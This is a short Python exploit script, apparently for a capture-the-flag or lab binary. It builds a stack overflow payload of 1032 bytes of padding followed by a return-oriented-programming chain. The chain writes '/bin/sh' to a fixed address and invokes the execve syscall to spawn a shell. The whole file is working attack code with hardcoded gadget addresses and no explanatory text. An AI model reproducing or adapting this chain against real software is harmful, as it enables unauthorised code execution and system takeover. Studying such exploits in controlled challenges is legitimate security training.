#!/usr/bin/env python3

import sys

def b(i):
    return i.to_bytes(8,"little")

offset = 1032

pop_rax = 0x0000000000415664
pop_rdi = 0x0000000000400686
pop_rsi = 0x00000000004101f3
pop_rdx = 0x000000000044be16

syscall = 0x000000000040129c

injec_addr = 0x7fffffffdd80
shell = 0x0068732f6e69622f

payload = b""
# payload += b(shell)
payload += b"A" * (offset - len(payload))

payload += b(pop_rdx)
payload += b"/bin/sh\x00"
payload += b(pop_rax)
payload += b(0x6b6000)
payload += b(0x48d251)

payload += b(pop_rax)
payload += b(0x3b)
payload += b(pop_rdi)
# payload += b(injec_addr)
payload += b(0x6b6000)
payload += b(pop_rsi)
payload += b(0x0)
payload += b(pop_rdx)
payload += b(0x0)

payload += b(syscall)

sys.stdout.buffer.write(payload)
